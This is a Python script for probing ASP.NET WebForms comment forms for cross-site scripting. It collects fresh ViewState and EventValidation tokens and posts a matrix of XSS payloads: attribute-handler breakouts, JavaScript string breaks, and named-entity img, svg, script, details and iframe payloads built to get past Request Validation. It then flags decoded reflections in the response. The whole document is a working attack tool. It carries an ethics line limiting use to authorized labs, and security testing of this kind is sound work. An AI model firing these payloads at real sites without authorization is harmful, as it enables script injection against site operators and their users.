#!/usr/bin/env python3
"""
Generic ASP.NET WebForms XSS probe — GET fresh tokens, fire a payload matrix,
scan for DECODED reflection (false-positive safe).

Usage:
  python3 aspnet_xss_probe.py http://HOST/add_comment1.aspx

What it covers (see references/aspnet-xss.md):
  - Request Validation blocks < > and numeric entities &#60;; named entities
    &lt; pass. So matrix mixes no-bracket breakouts + named entities.
  - Fresh __VIEWSTATE/__EVENTVALIDATION per request (stale => 500).
  - FALSE-POSITIVE SAFE: only flags a hit if the payload appears DECODED and
    is NOT inside a <textarea> (i.e. really rendered, not auto-encoded).

ETHICS: run only against your own lab / in-scope authorized target.
"""
import re, sys, requests

H = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
}

# (label, raw comment value) — requests encodes the value safely
PAYLOADS = [
    ("attr_onfocus",     '" onfocus=alert(1) autofocus x="'),
    ("attr_onmouseover", '" onmouseover=alert(1) x="'),
    ("attr_onpointerdown", '" onpointerdown=alert(1) x="'),
    ("js_break_dq",      '";alert(1);//'),
    ("js_break_sq",      "';alert(1);//"),
    ("named_img",        '&lt;img src=x onerror=alert(1)&gt;'),
    ("named_svg",        '&lt;svg onload=alert(1)&gt;'),
    ("named_script",     '&lt;script&gt;alert(1)&lt;/script&gt;'),
    ("named_details",    '&lt;details open ontoggle=alert(1)&gt;'),
    ("named_iframe",     '&lt;iframe src=javascript:alert(1)&gt;'),
]

def tokens(s, url):
    r = s.get(url, headers=H, timeout=20)
    vs = re.search(r'id="__VIEWSTATE" value="([^"]*)"', r.text)
    ev = re.search(r'id="__EVENTVALIDATION" value="([^"]*)"', r.text)
    vg = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]*)"', r.text)
    return (vs.group(1) if vs else "", ev.group(1) if ev else "", vg.group(1) if vg else "")

def inside_textarea(t, i):
    return t[:i].rfind('<textarea') > t[:i].rfind('</textarea')

def main():
    if len(sys.argv) < 2:
        print("usage: python3 aspnet_xss_probe.py http://HOST/page.aspx"); sys.exit(1)
    url = sys.argv[1]
    s = requests.Session()
    hits = 0
    for label, p in PAYLOADS:
        vs, ev, vg = tokens(s, url)
        if not vs or not ev:
            print(f"[!] {label}: no tokens — page not WebForms/blocked"); continue
        r = s.post(url, data={
            "__EVENTTARGET": "rptPaging$ctl03$btnPage", "__EVENTARGUMENT": "",
            "__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": vg, "__EVENTVALIDATION": ev,
            "txtName": "test", "txtEmail": "[REDACTED_EMAIL]", "txtComment": p,
        }, headers=H, timeout=20)
        blocked = "potentially dangerous" in r.text or r.status_code == 500
        # decoded-reflection detection (false-positive safe)
        i = r.text.find("alert(1)")
        decoded = False
        if i >= 0 and not blocked:
            # payload present AND not wrapped/encoded AND not in a textarea
            near = r.text[max(0,i-30):i+30]
            if "&quot;" not in near and "&amp;" not in near and not inside_textarea(r.text, i):
                decoded = True
        if decoded:
            hits += 1
            fn = f"/tmp/aspx_xss_{label}.html"
            open(fn, "w").write(r.text)
            print(f"[HIT {hits}] {label}: decoded reflection -> {fn}")
            print(f"        payload: {p}")
        else:
            print(f"[ ] {label}: blocked={blocked} (no decoded reflection)")
    print(f"\n[*] Decoded-reflection HITS: {hits}. 0 = no XSS sink on this page.")
    if hits == 0:
        print("[*] If the app stores comments, check a SEPARATE comment-display page —")
        print("    this submission form's own <textarea> reflection is always encoded.")

if __name__ == "__main__":
    main()
